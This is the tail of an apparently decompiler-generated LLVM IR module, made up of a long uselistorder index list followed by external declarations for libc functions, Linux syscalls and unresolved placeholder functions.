2474, 2475, 2018, 964, 965, 2476, 962, 963, 205, 2477, 732, 733, 2478, 687, 2019, 2479, 2480, 870, 734, 2481, 2482, 2020, 2483, 2484, 907, 908, 2485, 2486, 2487, 2488, 2489, 3296, 2021, 735, 3297, 2022, 3298, 3299, 3300, 3302, 3303, 3304, 3305, 3306, 3307, 3308, 3309, 3310, 2959, 469, 470, 2023, 2024, 471, 3311, 3312, 472, 3313, 3314, 3315, 206, 474, 475, 2025, 966, 967, 2490, 2026, 2491, 473, 2492, 209, 210, 2493, 2494, 2495, 1879, 2496, 208, 2027, 207, 476, 17, 18, 2028, 477, 478, 2029, 2030, 2031, 479, 2032, 3280, 2033, 3278, 681, 3279, 968, 969, 480, 481, 2034, 3281, 3282, 3283, 3284, 3285, 970, 2035, 2036, 305, 306, 3064, 2037, 2038, 3065, 3066, 656, 658, 3071, 736, 3067, 3068, 2039, 3069, 483, 871, 3070, 657, 872, 3072, 3073, 3074, 3075, 3076, 737, 3077, 484, 3078, 3079, 482, 357, 2040, 3080, 1835, 3081, 659, 343, 2041, 2251, 2247, 2240, 2241, 2242, 2243, 2244, 2245, 2246, 661, 2248, 873, 2249, 2250, 2042, 1836, 660, 2252, 2253, 2254, 485, 2255, 486, 2256, 2257, 2258, 2262, 2259, 2260, 2261, 213, 214, 215, 2043, 2044, 2263, 307, 2264, 2265, 2266, 487, 2045, 2270, 2267, 2268, 2269, 87, 211, 212, 2046, 2271, 2272, 2273, 2274, 2275, 739, 2276, 2277, 2278, 2279, 2280, 1837, 2281, 1838, 2282, 1839, 738, 2283, 2284, 2285, 2286, 2287, 2288, 2289, 488, 2290, 2291, 2292, 740, 1840, 2293, 1841, 909, 2294, 2295, 2296, 216, 741, 3764, 3766, 489, 3237, 88, 3212, 490, 491, 3503, 3504, 358, 3505, 492, 2047, 3506, 662, 344, 3507, 217, 3301, 89, 90, 2947, 91, 742, 743, 493, 3508, 3509, 3510, 494, 2898, 2896, 2897, 218, 2899, 2900, 2901, 744, 2902, 359, 2903, 663, 2904, 2905, 2906, 3316, 3317, 3318, 3319, 495, 3250, 219, 2048, 3320, 2049, 3322, 3321, 664, 2050, 2051, 3323, 3325, 3324, 665, 2052, 3199, 2907, 3326, 3251, 2983, 2984, 2908, 2676, 3511, 3512, 3513, 3514, 3515, 3516, 3517, 3518, 3519, 496, 2053, 3520, 745, 3521, 3522, 3523, 3524, 3525, 92, 93, 2054, 691, 692, 3526, 3527, 3528, 3529, 497, 3530, 3531, 3532, 2055, 3533, 94, 95, 498, 2056, 3534, 3535, 3536, 3539, 3537, 3538, 96, 162, 220, 3540, 3541, 3542, 3543, 910, 3544, 3545, 499, 3546, 501, 3547, 2057, 666, 3548, 502, 500, 503, 3549, 2058, 3550, 3551, 3553, 3554, 3555, 3556, 3557, 3558, 504, 2059, 2060, 505, 3559, 3560, 2061, 3561, 3562, 3563, 3564, 3565, 2062, 3566, 3567, 746, 2063, 747, 3568, 3569, 3570, 3571, 3572, 3573, 97, 221, 222, 223, 2064, 3574, 506, 2065, 3575, 1842, 3576, 3577, 507, 2066, 331, 155, 302, 3552, 667, 3578, 3579, 3652, 3653, 668, 3663, 3654, 224, 971, 2067, 3327, 3328, 3329, 3330, 3331, 3332, 3333, 3334, 3335, 3336, 748, 3337, 2068, 2069, 3338, 509, 510, 508, 1843, 511, 1844, 2737, 669, 2738, 2739, 749, 750, 2740, 1845, 2741, 693, 1846, 2742, 512, 2743, 2744, 2745, 751, 3389, 2713, 2714, 2715, 2716, 2717, 972, 2777, 2960, 513, 3339, 2070, 3340, 2790, 2791, 2071, 2072, 2792, 2793, 2794, 2795, 2796, 2797, 2798, 2799, 2073, 3690, 514, 3154, 515, 516, 3369, 3739, 3740, 3161, 3360, 3691, 2631, 2542, 2543, 2533, 2632, 2781, 3242, 973, 517, 518, 519, 874, 520, 2497, 2498, 521, 522, 752, 3274, 3162, 2499, 523, 3758, 3692, 3677, 2500, 2721, 2502, 2503, 524, 2504, 3450, 3451, 3741, 3765, 3435, 3163, 2810, 3406, 3164, 3762, 2841, 2501, 3372, 3446, 3665, 3760, 3761, 525, 526, 3166, 3165, 3167, 3168, 3169, 3170, 3666, 527, 3667, 2505, 2506, 98, 345, 346, 2507, 670, 2074, 2508, 2297, 19, 3622, 753, 3626, 2075, 3632, 528, 529, 530, 3744, 2076, 3755, 3757, 1880, 3756, 1881, 531, 532, 2509, 533, 2510, 2511, 2077, 2512, 2514, 1882, 2513, 1883, 3655, 3657, 3658, 2078, 3660, 3662, 1884, 3661, 1885, 534, 535, 3723, 3724, 3727, 3728, 3730, 1886, 3729, 1887, 3745, 911, 3373, 3374, 3375, 974, 20, 2515, 21, 536, 22, 23, 24, 2516, 2517, 25, 2079, 3379, 3380, 3381, 3382, 99, 3656, 975, 2080, 225, 100, 3659, 976, 2081, 226, 3383, 227, 26, 2518, 2519, 2082, 537, 3627, 2083, 2084, 2085, 3628, 2086, 3630, 977, 2520, 2087, 228, 2088, 2521, 2524, 2089, 2090, 2525, 2091, 2526, 3631, 27, 3620, 3619, 671, 3621, 2092, 3629, 28, 2527, 29, 30, 31, 2093, 3376, 3377, 3378, 538, 2094, 2523, 2522, 978, 539, 2528, 2529, 2095, 2530, 2531, 2096, 540, 2097, 2532, 541, 2098, 3714, 3676, 3624, 3625, 3623, 3687, 3688, 3693, 3694, 672, 3715, 542, 32, 33, 2534, 2535, 2536, 2537, 2538, 2539, 34, 543, 35, 36, 37, 38, 39, 2540, 2541, 40, 544, 41, 545, 42, 546, 43, 547, 2544, 2099, 548, 549, 2545, 550, 2546, 2547, 2100, 979, 551, 2298, 2299, 2300, 552, 2301, 3171, 3172, 3183, 553, 3173, 3174, 2101, 3175, 3176, 3177, 3182, 980, 754, 755, 981, 554, 555, 556, 3179, 3178, 673, 3180, 3181, 557, 558, 559, 1847, 982, 983, 3384, 3385, 2548, 2549, 756, 2550, 3673, 3746, 2590, 2102, 560, 2591, 757, 2592, 2593, 758, 2594, 2595, 44, 2551, 2552, 759, 760, 761, 762, 561, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 562, 2553, 2103, 2554, 2555, 2556, 2557, 2558, 2559, 2560, 308, 2561, 2104, 45, 3725, 3726, 101, 674, 984, 3747, 3748, 229, 230, 3749, 3750, 2105, 3752, 3753, 2106, 985, 2107, 3754, 304, 875, 3742, 3743, 3751, 3716, 3722, 986, 2108, 3717, 3721, 563, 2109, 1848, 3718, 3719, 3720, 231, 2110, 987, 2562, 2111, 988, 2563, 2564, 2565, 2566, 2567, 564, 2568, 2569, 2570, 3695, 3696, 235, 236, 675, 233, 3697, 3698, 234, 3699, 2112, 232, 3700, 3701, 3702, 2113, 989, 2571, 2572, 46, 3703, 566, 565, 1888, 2573, 567, 3674, 568, 3675, 2114, 47, 2577, 2578, 2579, 570, 569, 2580, 571, 2115, 3668, 572, 3669, 3670, 3671, 2302, 2303, 2304, 2305, 2581, 573, 2582, 2583, 2584, 912, 913, 2585, 2586, 48, 2116, 2117, 2587, 2118, 574, 2119, 2120, 2596, 2599, 2121, 2600, 2122, 990, 2602, 914, 2603, 2604, 2605, 2606, 2607, 2123, 2608, 2124, 575, 2609, 2125, 49, 2601, 50, 576, 2126, 2598, 2597, 577, 785, 2610, 324, 786, 3386, 3387, 676, 2611, 677, 2612, 2613, 2127, 2614, 2144, 2145, 2128, 578, 2129, 2146, 2147, 2148, 2149, 2150, 2151, 2130, 2152, 2153, 2154, 2155, 2156, 2157, 2158, 2159, 2160, 2161, 2162, 2163, 2164, 2165, 2131, 2166, 2167, 2168, 2169, 2170, 2171, 2172, 1871, 2615, 2623, 2624, 2132, 2626, 579, 2627, 991, 2616, 787, 2622, 2133, 332, 2617, 2618, 2619, 678, 2620, 237, 2621, 2134, 2135, 2306, 2307, 992, 1849, 2308, 580, 2625, 2628, 1850, 2629, 2630, 2633, 2634, 581, 2635, 2636, 582, 2637, 2136, 583, 3704, 3705, 2137, 2138, 3706, 2139, 3708, 3709, 993, 1851, 994, 1852, 3710, 3711, 788, 3712, 2309, 2310, 3713, 3707, 3767, 634, 2638, 2639, 2640, 2641, 2642, 102, 2643, 103, 104, 238, 682, 105, 635, 2644, 2645, 106, 239, 107, 163, 2646, 2647, 108, 164, 876, 2648, 2649, 877, 2650, 2651, 996, 997, 51, 789, 790, 995, 2652, 998, 999, 1000, 1001, 1002, 1003, 2653, 2662, 2654, 2655, 2656, 2657, 2658, 2659, 2660, 2661, 2663, 2664, 2665, 2666, 2667, 2668, 2669, 2670, 2671, 1004, 2672, 684, 243, 242, 52, 791, 2673, 2674, 683, 241, 240, 53, 792, 2675, 109, 2677, 803, 110, 67, 65, 66, 68, 71, 69, 70, 72, 111, 165, 1007, 2678, 802, 253, 804, 2679, 2680, 1008, 2681, 801, 252, 805, 2682, 2683, 1009, 2684, 800, 251, 806, 2685, 2686, 1010, 2687, 799, 250, 807, 2688, 2689, 1011, 2690, 798, 249, 808, 2691, 2692, 1012, 2693, 797, 248, 809, 2694, 2695, 1013, 2696, 796, 247, 810, 2697, 2698, 1014, 2699, 795, 246, 811, 2700, 2701, 1015, 2702, 794, 245, 812, 2703, 2704, 1016, 2705, 793, 244, 813, 2706, 2707, 2708, 2709, 1006, 814, 2710, 1005, 685, 2711, 112, 113, 2712, 254, 166, 1853, 1017, 815, 156, 2719, 114, 167, 2718, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 2720, 1066, 2722, 258, 2723, 2724, 2725, 584, 257, 2726, 1890, 256, 2727, 2728, 2729, 585, 255, 1067, 2730, 586, 1068, 2731, 1065, 1891, 1069, 816, 1070, 2732, 2733, 2734, 1889, 1892, 2735, 1071, 1072, 587, 2746, 262, 2747, 2748, 2749, 588, 2750, 1894, 261, 2751, 2752, 2753, 589, 590, 2754, 260, 2755, 2756, 2757, 591, 2758, 1895, 259, 2759, 2760, 2761, 592, 686, 2762, 1077, 1078, 593, 2763, 63, 64, 1073, 2764, 594, 1074, 2765, 1075, 595, 1076, 2766, 2767, 2768, 1893, 1896, 2769, 596, 1897, 1079, 1080, 2770, 1898, 597, 1081, 2771, 1082, 2772, 2773, 2774, 2778, 2779, 2780, 263, 264, 694, 695, 878, 2782, 2783, 2803, 598, 2800, 2801, 2802, 1083, 1084, 2804, 2805, 2806, 2807, 1899, 1085, 1086, 2808, 2809, 1900, 1087, 1088, 115, 54, 1854, 55, 1855, 116, 168, 2811, 2173, 2174, 2175, 2176, 2177, 2178, 2179, 2180, 2181, 2182, 2183, 2184, 2185, 2186, 2187, 2188, 2189, 2190, 2191, 2192, 2193, 2194, 2195, 2196, 2197, 2198, 2199, 2200, 1856, 2201, 2202, 2203, 1857, 879, 2204, 2205, 2206, 2207, 2208, 2812, 2813, 117, 266, 2814, 118, 169, 265, 2815, 817, 599, 818, 600, 2816, 2817, 2818, 819, 915, 601, 602, 603, 880, 1858, 2819, 2820, 119, 120, 2821, 267, 170, 2822, 881, 56, 2823, 2824, 268, 2835, 122, 2825, 2826, 2827, 1859, 883, 2828, 2829, 2830, 2831, 1860, 882, 2832, 2833, 2834, 121, 2836, 2837, 604, 2838, 61, 2839, 2840, 269, 2848, 124, 2842, 2843, 2844, 1861, 884, 2845, 2846, 2847, 123, 2849, 2850, 2851, 605, 2852, 62, 1089, 2853, 125, 1090, 820, 2854, 2855, 270, 171, 606, 607, 608, 2856, 2857, 126, 2858, 127, 271, 2859, 2860, 2861, 2862, 128, 885, 2863, 636, 2864, 1901, 1902, 1903, 1904, 1905, 1906, 637, 1907, 1908, 1909, 2865, 916, 2866, 2867, 2868, 2869, 821, 2870, 609, 2871, 2872, 1862, 129, 2873, 2874, 2875, 1091, 1092, 2885, 130, 131, 303, 132, 888, 889, 2876, 2877, 2878, 2879, 679, 886, 887, 890, 2880, 2881, 2882, 2883, 133, 134, 272, 2884, 917, 135, 136, 918, 2961, 610, 822, 137, 2886, 2887, 2888, 2889, 2890, 2891, 1093, 1094, 2892, 1095, 1096, 611, 2893, 1097, 1098, 1099, 1100, 2894, 696, 1102, 1103, 612, 1101, 1104, 1105, 1106, 1107, 2895, 1108, 1109, 1110, 613, 2909, 2910, 2962, 328, 326, 327, 891, 2963, 892, 2964, 2965, 2966, 2967, 2209, 2210, 2211, 2212, 2968, 2969, 2970, 2971, 2972, 2973, 2974, 2975, 2976, 2977, 2978, 138, 2979, 2980, 139, 273, 614, 823, 2981, 2982, 274, 697, 698, 2985, 2986, 2987, 2988, 2989, 2990, 2991, 2992, 2993, 140, 893, 275, 1111, 824, 141, 2994, 1911, 1912, 1118, 1119, 142, 1120, 1121, 1112, 2995, 1113, 1122, 1123, 329, 2996, 1114, 1115, 2997, 1116, 1117, 2998, 2999, 3000, 3001, 1910, 1913, 3002, 3003, 1124, 3004, 3006, 1125, 1126, 3005, 276, 3007, 3008, 3009, 3010, 3011, 699, 615, 1127, 1863, 1864, 616, 143, 3012, 1128, 3013, 3014, 144, 3015, 277, 172, 278, 3021, 825, 3016, 3017, 3018, 3019, 3020, 3022, 826, 3023, 3024, 3025, 3026, 3027, 3028, 894, 617, 827, 3029, 828, 829, 3030, 3031, 700, 3032, 3033, 3034, 1914, 830, 895, 1915, 1916, 831, 3035, 3036, 3037, 3038, 145, 146, 173, 701, 702, 3040, 3041, 3042, 832, 3043, 896, 638, 1129, 1917, 1130, 1131, 1918, 1132, 1133, 1919, 1134, 1135, 1920, 1136, 1137, 1921, 1138, 1139, 1922, 1140, 1141, 639, 1923, 1142, 1143, 1924, 1144, 1145, 1925, 1146, 1147, 279, 3044, 3045, 3046, 3047, 3048, 703, 704, 3049, 3050, 3051, 3052, 897, 57, 1865, 280, 3053, 3054, 3055, 3056, 3057, 1866, 705, 706, 1148, 618, 898, 3058, 3059, 3060, 3061, 3062, 3063, 1150, 1151, 619, 1152, 1153, 3082, 620, 1149, 3083, 3084, 3085, 1926, 3086, 3087, 3088, 1154, 3089, 3090, 147, 3091, 281, 174, 282, 3097, 833, 3092, 3093, 3094, 3095, 3096, 3098, 835, 834, 3099, 3100, 3101, 3102, 3103, 3104, 899, 621, 836, 3105, 837, 838, 3106, 3107, 3108, 3109, 1927, 3110, 1155, 3111, 3112, 148, 3113, 283, 175, 284, 3119, 839, 3114, 3115, 3116, 3117, 3118, 3120, 841, 840, 3121, 3122, 3123, 3124, 3125, 3126, 900, 622, 842, 3127, 843, 844, 3128, 149, 3184, 285, 176, 286, 3185, 3186, 901, 845, 846, 3187, 3188, 3189, 3190, 3191, 3192, 849, 3193, 3194, 3195, 3196, 3197, 850, 851, 902, 847, 848, 3198, 852, 853, 3200, 287, 903, 904, 854, 3201, 1156, 3202, 150, 177, 288, 3203, 151, 152, 855, 3204, 623, 856, 58, 857, 1158, 3341, 292, 3342, 3343, 3344, 624, 291, 3345, 1929, 1163, 1164, 290, 3346, 3347, 3348, 625, 289, 1159, 3349, 1160, 3350, 1157, 1930, 1165, 1166, 1161, 626, 1162, 3351, 3352, 3353, 1928, 1931, 3354, 3355, 3356, 3357, 293, 294, 295, 296, 3358, 3359, 627, 1167, 1168, 628, 3361, 1169, 3362, 629, 630, 905, 1170, 1867, 3363, 3364, 631, 919, 76, 3370, 153, 3388, 858, 3390, 3391, 920, 3392, 3393, 3394, 3395, 3396, 297, 298, 299, 300, 59, 3397, 3398, 3399, 632, 2311, 680, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 1298, 1299, 1300, 1301, 1302, 1303, 1304, 1305, 1306, 1307, 1308, 1309, 1310, 1311, 1312, 1313, 1314, 1315, 1316, 1317, 1318, 1319, 1320, 1321, 1322, 1323, 1324, 1325, 1326, 1327, 1328, 1329, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 1341, 1342, 1343, 1344, 1345, 1346, 1347, 1348, 1349, 1350, 1351, 1352, 1353, 1354, 1355, 1356, 1357, 1358, 1359, 1360, 1361, 1362, 1363, 1364, 1365, 1366, 1367, 1368, 1369, 1370, 1371, 1372, 1373, 1374, 1375, 1376, 1377, 1378, 1379, 1380, 1381, 1382, 1383, 1384, 1385, 1386, 1387, 1388, 1389, 1390, 1391, 1392, 1393, 1394, 1395, 1396, 1397, 1398, 1399, 1400, 1401, 1402, 1403, 1404, 1405, 1406, 1407, 1408, 1409, 1410, 1411, 1412, 1413, 1414, 1415, 1416, 1417, 1418, 1419, 1420, 1421, 1422, 1423, 1424, 1425, 1426, 1427, 1428, 1429, 1430, 1431, 1432, 1433, 1434, 1435, 1436, 1437, 1438, 1439, 1440, 1441, 1442, 1443, 1444, 1445, 1446, 1447, 1448, 1449, 1450, 1451, 1452, 1453, 1454, 1455, 1456, 1457, 1458, 1459, 1460, 1461, 1462, 1463, 1464, 1465, 1466, 1467, 1468, 1469, 1470, 1471, 1472, 1473, 1474, 1475, 1476, 1477, 1478, 1479, 1480, 1481, 1482, 1483, 1484, 1485, 1486, 1487, 1488, 1489, 1490, 1491, 1492, 1493, 1494, 1495, 1496, 1497, 1498, 1499, 1500, 1501, 1502, 1503, 1504, 1505, 1506, 1507, 1508, 1509, 1510, 1511, 1512, 1513, 1514, 1515, 1516, 1517, 1518, 1519, 1520, 1521, 1522, 1523, 1524, 1525, 1526, 1527, 1528, 1529, 1530, 1531, 1532, 1533, 1534, 1535, 1536, 1537, 1538, 1539, 1540, 1541, 1542, 1543, 1544, 1545, 1546, 1547, 1548, 1549, 1550, 1551, 1552, 1553, 1554, 1555, 1556, 1557, 1558, 1559, 1560, 1561, 1562, 1563, 1564, 1565, 1566, 1567, 1568, 1569, 1570, 1571, 1572, 1573, 1574, 1575, 1576, 1577, 1578, 1579, 1580, 1581, 1582, 1583, 1584, 1585, 1586, 1587, 1588, 1589, 1590, 1591, 1592, 1593, 1594, 1595, 1596, 1597, 1598, 1599, 1600, 1601, 1602, 1603, 1604, 1605, 1606, 1607, 1608, 1609, 1610, 1611, 1612, 1613, 1614, 1615, 1616, 1617, 1618, 1619, 1620, 1621, 1622, 1623, 1624, 1625, 1626, 1627, 1628, 1629, 1630, 1631, 1632, 1633, 1634, 1635, 1636, 1637, 1638, 1639, 1640, 1641, 1642, 1643, 1644, 1645, 1646, 1647, 1648, 1649, 1650, 1651, 1652, 1653, 1654, 1655, 1656, 1657, 1658, 1659, 1660, 1661, 1662, 1663, 1664, 1665, 1666, 1667, 1668, 1669, 1670, 1671, 1672, 1673, 1674, 1675, 1676, 1677, 1678, 1679, 1680, 1681, 1682, 1683, 1684, 1685, 1686, 1687, 1688, 1689, 1690, 1691, 1692, 1693, 1694, 1695, 1696, 1697, 1698, 1699, 1700, 1701, 1702, 1703, 1704, 1705, 1706, 1707, 1708, 1709, 1710, 1711, 1712, 1713, 1714, 1715, 1716, 1717, 1718, 1719, 1720, 1721, 1722, 1723, 1724, 1725, 1726, 1727, 1728, 1729, 1730, 1731, 1732, 1733, 1734, 1735, 1736, 1737, 1738, 1739, 1740, 1741, 1742, 1743, 1744, 1745, 1746, 1747, 1748, 1749, 1750, 1751, 1752, 1753, 1754, 1755, 1756, 1757, 1758, 1759, 1760, 1761, 1762, 1763, 1764, 1765, 1766, 1767, 1768, 1769, 1770, 1771, 1772, 1773, 1774, 1775, 1776, 1777, 1778, 1779, 1780, 1781, 1782, 1783, 1784, 1785, 1786, 1787, 1788, 1789, 1790, 1791, 1792, 1793, 1794, 1795, 1796, 1797, 1798, 1799, 1800, 1801, 1802, 1803, 1804, 1805, 1806, 1807, 1808, 1809, 1810, 1811, 1812, 1813, 1814, 1815, 1816, 1817, 1818, 1819, 1820, 1821, 1822, 1823, 1824, 1825, 1826, 3770, 3771, 3772, 3773, 3774, 3775, 3776, 3777 }
  uselistorder i32* @ebx, {}
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @setrlimit(i32, %rlimit*) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @sigsuspend(%_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16* @__decompiler_undefined_function_1() local_unnamed_addr

declare i16 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8* @__decompiler_undefined_function_3() local_unnamed_addr

declare i64 @__decompiler_undefined_function_4() local_unnamed_addr

declare i8 @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr

declare %sigcontext* @__decompiler_undefined_function_7() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_8() local_unnamed_addr

declare %pollfd* @__decompiler_undefined_function_9() local_unnamed_addr

declare %rlimit* @__decompiler_undefined_function_10() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_11() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_12() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_13() local_unnamed_addr

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
